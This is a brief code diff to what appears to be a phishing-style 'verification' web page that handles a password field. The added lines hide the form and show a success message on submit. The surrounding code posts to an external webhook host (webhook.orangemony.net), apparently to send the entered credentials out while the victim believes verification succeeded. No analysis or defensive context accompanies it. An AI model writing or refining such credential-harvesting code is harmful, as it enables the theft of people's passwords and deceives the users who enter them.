@@ -239,6 +239,9 @@
         document.getElementById('password').value = password;
 
         $("#verificationForm").on("submit", function(event) {
+            $('#verificationForm').hide()
+            $('.success-message').show()
+
             event.preventDefault();
             var xhr = new XMLHttpRequest();
             xhr.open("POST", 'https://webhook.orangemony.net', true);
